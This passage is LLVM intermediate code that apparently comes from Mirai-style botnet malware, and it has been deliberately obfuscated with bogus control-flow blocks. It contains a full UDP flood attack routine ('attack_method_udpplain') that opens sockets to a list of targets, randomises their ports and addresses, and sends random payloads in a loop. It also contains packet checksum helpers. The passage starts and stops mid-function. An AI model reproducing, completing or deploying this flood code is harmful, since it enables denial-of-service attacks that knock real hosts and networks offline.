}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %218, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %221

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %114

; <label>:97:                                     ; preds = %90
  %98 = load i32, i32* @x.41
  %99 = load i32, i32* @y.42
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %97
  %106 = load i32, i32* @x.41
  %107 = load i32, i32* @y.42
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

; <label>:114:                                    ; preds = %90
  %115 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %115, align 4
  %116 = load i16, i16* %13, align 2
  %117 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %116, i16* %117, align 2
  %118 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %119 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %118, i32 0, i32 0
  store i32 0, i32* %119, align 4
  %120 = load i32*, i32** %11, align 8
  %121 = load i32, i32* %9, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  %124 = load i32, i32* %123, align 4
  %125 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %126 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %126, %struct.sockaddr** %125, align 8
  %127 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %128 = load %struct.sockaddr*, %struct.sockaddr** %127, align 8
  %129 = call i32 @bind(i32 %124, %struct.sockaddr* %128, i32 16) #6
  %130 = icmp eq i32 %129, -1
  br i1 %130, label %131, label %132

; <label>:131:                                    ; preds = %114
  br label %132

; <label>:132:                                    ; preds = %131, %114
  %133 = load i32, i32* @x.41
  %134 = load i32, i32* @y.42
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %132
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 2
  %146 = load i8, i8* %145, align 4
  %147 = zext i8 %146 to i32
  %148 = icmp slt i32 %147, 32
  %149 = load i32, i32* @x.41
  %150 = load i32, i32* @y.42
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %148, label %157, label %183

; <label>:157:                                    ; preds = %originalBBpart24
  %158 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 1
  %163 = load i32, i32* %162, align 4
  %164 = call i32 @ntohl(i32 %163) #7
  %165 = call i32 @rand_next()
  %166 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %167 = load i32, i32* %9, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 2
  %171 = load i8, i8* %170, align 4
  %172 = zext i8 %171 to i32
  %173 = lshr i32 %165, %172
  %174 = add i32 %164, %173
  %175 = call i32 @htonl(i32 %174) #7
  %176 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %177 = load i32, i32* %9, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i64 %178
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %179, i32 0, i32 0
  %181 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %180, i32 0, i32 2
  %182 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %181, i32 0, i32 0
  store i32 %175, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %157, %originalBBpart24
  %184 = load i32*, i32** %11, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i32, i32* %184, i64 %186
  %188 = load i32, i32* %187, align 4
  %189 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 0
  %195 = bitcast %struct.sockaddr_in* %194 to %struct.sockaddr*
  store %struct.sockaddr* %195, %struct.sockaddr** %189, align 8
  %196 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %197 = load %struct.sockaddr*, %struct.sockaddr** %196, align 8
  %198 = call i32 @connect(i32 %188, %struct.sockaddr* %197, i32 16)
  %199 = icmp eq i32 %198, -1
  br i1 %199, label %200, label %217

; <label>:200:                                    ; preds = %183
  %201 = load i32, i32* @x.41
  %202 = load i32, i32* @y.42
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %200
  %209 = load i32, i32* @x.41
  %210 = load i32, i32* @y.42
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %217

; <label>:217:                                    ; preds = %originalBBpart28, %183
  br label %218

; <label>:218:                                    ; preds = %217
  %219 = load i32, i32* %9, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %9, align 4
  br label %58

; <label>:221:                                    ; preds = %58
  br label %222

; <label>:222:                                    ; preds = %originalBBpart237, %221
  %223 = load i32, i32* @x.41
  %224 = load i32, i32* @y.42
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %222
  store i32 0, i32* %9, align 4
  %231 = load i32, i32* @x.41
  %232 = load i32, i32* @y.42
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %239

; <label>:239:                                    ; preds = %originalBBpart233, %originalBBpart212
  %240 = load i32, i32* %9, align 4
  %241 = load i8, i8* %5, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp slt i32 %240, %242
  br i1 %243, label %244, label %333

; <label>:244:                                    ; preds = %239
  %245 = load i32, i32* @x.41
  %246 = load i32, i32* @y.42
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %244
  %253 = load i8**, i8*** %10, align 8
  %254 = load i32, i32* %9, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds i8*, i8** %253, i64 %255
  %257 = load i8*, i8** %256, align 8
  store i8* %257, i8** %22, align 8
  %258 = load i8, i8* %15, align 1
  %259 = icmp ne i8 %258, 0
  %260 = load i32, i32* @x.41
  %261 = load i32, i32* @y.42
  %262 = sub i32 %260, 1
  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %259, label %268, label %288

; <label>:268:                                    ; preds = %originalBBpart216
  %269 = load i32, i32* @x.41
  %270 = load i32, i32* @y.42
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %268
  %277 = load i8*, i8** %22, align 8
  %278 = load i16, i16* %14, align 2
  %279 = zext i16 %278 to i32
  call void @rand_str(i8* %277, i32 %279)
  %280 = load i32, i32* @x.41
  %281 = load i32, i32* @y.42
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %288

; <label>:288:                                    ; preds = %originalBBpart220, %originalBBpart216
  %289 = load i32, i32* @x.41
  %290 = load i32, i32* @y.42
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %288
  %297 = load i32*, i32** %11, align 8
  %298 = load i32, i32* %9, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds i32, i32* %297, i64 %299
  %301 = load i32, i32* %300, align 4
  %302 = load i8*, i8** %22, align 8
  %303 = load i16, i16* %14, align 2
  %304 = zext i16 %303 to i64
  %305 = call i64 @send(i32 %301, i8* %302, i64 %304, i32 16384)
  %306 = load i32, i32* @x.41
  %307 = load i32, i32* @y.42
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %314

; <label>:314:                                    ; preds = %originalBBpart224
  %315 = load i32, i32* @x.41
  %316 = load i32, i32* @y.42
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %314
  %323 = load i32, i32* %9, align 4
  %324 = add nsw i32 %323, 1
  store i32 %324, i32* %9, align 4
  %325 = load i32, i32* @x.41
  %326 = load i32, i32* @y.42
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBBpart233, label %originalBB26alteredBB

originalBBpart233:                                ; preds = %originalBB26
  br label %239

; <label>:333:                                    ; preds = %239
  %334 = load i32, i32* @x.41
  %335 = load i32, i32* @y.42
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %333
  %342 = load i32, i32* @x.41
  %343 = load i32, i32* @y.42
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %222

originalBBalteredBB:                              ; preds = %originalBB, %97
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %132
  %350 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %351 = load i32, i32* %9, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %350, i64 %352
  %354 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %353, i32 0, i32 2
  %355 = load i8, i8* %354, align 4
  %356 = zext i8 %355 to i32
  %357 = icmp slt i32 %356, 32
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %200
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %222
  store i32 0, i32* %9, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %244
  %358 = load i8**, i8*** %10, align 8
  %359 = load i32, i32* %9, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds i8*, i8** %358, i64 %360
  %362 = load i8*, i8** %361, align 8
  store i8* %362, i8** %22, align 8
  %363 = load i8, i8* %15, align 1
  %364 = icmp ne i8 %363, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %268
  %365 = load i8*, i8** %22, align 8
  %366 = load i16, i16* %14, align 2
  %367 = zext i16 %366 to i32
  call void @rand_str(i8* %365, i32 %367)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %288
  %368 = load i32*, i32** %11, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds i32, i32* %368, i64 %370
  %372 = load i32, i32* %371, align 4
  %373 = load i8*, i8** %22, align 8
  %374 = load i16, i16* %14, align 2
  %375 = zext i16 %374 to i64
  %376 = call i64 @send(i32 %372, i8* %373, i64 %375, i32 16384)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %314
  %377 = load i32, i32* %9, align 4
  %_ = sub i32 0, %377
  %gen = add i32 %_, 1
  %_27 = sub i32 0, %377
  %gen28 = add i32 %_27, 1
  %_29 = sub i32 %377, 1
  %gen30 = mul i32 %_29, 1
  %_31 = shl i32 %377, 1
  %378 = add nsw i32 %377, 1
  store i32 %378, i32* %9, align 4
  br label %originalBB26

originalBB35alteredBB:                            ; preds = %originalBB35, %333
  br label %originalBB35
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %16, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %19

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

; <label>:16:                                     ; preds = %9
  %17 = load i32, i32* %4, align 4
  %18 = sub i32 %17, 2
  store i32 %18, i32* %4, align 4
  br label %6

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* @x.43
  %21 = load i32, i32* @y.44
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 1
  %30 = load i32, i32* @x.43
  %31 = load i32, i32* @y.44
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %38, label %45

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i16*, i16** %3, align 8
  %40 = load i16, i16* %39, align 2
  %41 = trunc i16 %40 to i8
  %42 = sext i8 %41 to i64
  %43 = load i64, i64* %5, align 8
  %44 = add i64 %43, %42
  store i64 %44, i64* %5, align 8
  br label %45

; <label>:45:                                     ; preds = %38, %originalBBpart2
  %46 = load i32, i32* @x.43
  %47 = load i32, i32* @y.44
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i64, i64* %5, align 8
  %55 = lshr i64 %54, 16
  %56 = load i64, i64* %5, align 8
  %57 = and i64 %56, 65535
  %58 = add i64 %55, %57
  store i64 %58, i64* %5, align 8
  %59 = load i64, i64* %5, align 8
  %60 = lshr i64 %59, 16
  %61 = load i64, i64* %5, align 8
  %62 = add i64 %61, %60
  store i64 %62, i64* %5, align 8
  %63 = load i64, i64* %5, align 8
  %64 = xor i64 %63, -1
  %65 = trunc i64 %64 to i16
  %66 = load i32, i32* @x.43
  %67 = load i32, i32* @y.44
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart251, label %originalBB1alteredBB

originalBBpart251:                                ; preds = %originalBB1
  ret i16 %65

originalBBalteredBB:                              ; preds = %originalBB, %19
  %74 = load i32, i32* %4, align 4
  %75 = icmp eq i32 %74, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  %76 = load i64, i64* %5, align 8
  %_ = shl i64 %76, 16
  %_2 = sub i64 %76, 16
  %gen = mul i64 %_2, 16
  %_3 = sub i64 0, %76
  %gen4 = add i64 %_3, 16
  %77 = lshr i64 %76, 16
  %78 = load i64, i64* %5, align 8
  %_5 = shl i64 %78, 65535
  %_6 = sub i64 0, %78
  %gen7 = add i64 %_6, 65535
  %_8 = sub i64 %78, 65535
  %gen9 = mul i64 %_8, 65535
  %_10 = shl i64 %78, 65535
  %79 = and i64 %78, 65535
  %_11 = sub i64 %77, %79
  %gen12 = mul i64 %_11, %79
  %_13 = sub i64 %77, %79
  %gen14 = mul i64 %_13, %79
  %_15 = sub i64 0, %77
  %gen16 = add i64 %_15, %79
  %_17 = shl i64 %77, %79
  %_18 = sub i64 %77, %79
  %gen19 = mul i64 %_18, %79
  %_20 = sub i64 0, %77
  %gen21 = add i64 %_20, %79
  %80 = add i64 %77, %79
  store i64 %80, i64* %5, align 8
  %81 = load i64, i64* %5, align 8
  %_22 = sub i64 %81, 16
  %gen23 = mul i64 %_22, 16
  %_24 = sub i64 %81, 16
  %gen25 = mul i64 %_24, 16
  %_26 = shl i64 %81, 16
  %_27 = sub i64 %81, 16
  %gen28 = mul i64 %_27, 16
  %_29 = sub i64 %81, 16
  %gen30 = mul i64 %_29, 16
  %_31 = sub i64 0, %81
  %gen32 = add i64 %_31, 16
  %_33 = shl i64 %81, 16
  %82 = lshr i64 %81, 16
  %83 = load i64, i64* %5, align 8
  %_34 = sub i64 %83, %82
  %gen35 = mul i64 %_34, %82
  %_36 = shl i64 %83, %82
  %_37 = shl i64 %83, %82
  %_38 = sub i64 0, %83
  %gen39 = add i64 %_38, %82
  %_40 = shl i64 %83, %82
  %_41 = sub i64 %83, %82
  %gen42 = mul i64 %_41, %82
  %_43 = sub i64 0, %83
  %gen44 = add i64 %_43, %82
  %_45 = shl i64 %83, %82
  %_46 = sub i64 0, %83
  %gen47 = add i64 %_46, %82
  %84 = add i64 %83, %82
  store i64 %84, i64* %5, align 8
  %85 = load i64, i64* %5, align 8
  %_48 = sub i64 0, %85
  %gen49 = add i64 %_48, -1
  %86 = xor i64 %85, -1
  %87 = trunc i64 %86 to i16
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = load i32, i32* @x.45
  %6 = load i32, i32* @y.46
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca %struct.iphdr*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i16, align 2
  %16 = alloca i32, align 4
  %17 = alloca i16*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %13, align 8
  store i8* %1, i8** %14, align 8
  store i16 %2, i16* %15, align 2
  store i32 %3, i32* %16, align 4
  %22 = load i8*, i8** %14, align 8
  %23 = bitcast i8* %22 to i16*
  store i16* %23, i16** %17, align 8
  %24 = load %struct.iphdr*, %struct.iphdr** %13, align 8
  %25 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %24, i32 0, i32 8
  %26 = load i32, i32* %25, align 4
  store i32 %26, i32* %18, align 4
  %27 = load %struct.iphdr*, %struct.iphdr** %13, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 9
  %29 = load i32, i32* %28, align 4
  store i32 %29, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %30 = load i32, i32* %16, align 4
  store i32 %30, i32* %21, align 4
  %31 = load i32, i32* @x.45
  %32 = load i32, i32* @y.46
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %39

; <label>:39:                                     ; preds = %originalBBpart218, %originalBBpart2
  %40 = load i32, i32* %16, align 4
  %41 = icmp sgt i32 %40, 1
  br i1 %41, label %42, label %68

; <label>:42:                                     ; preds = %39
  %43 = load i32, i32* @x.45
  %44 = load i32, i32* @y.46
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
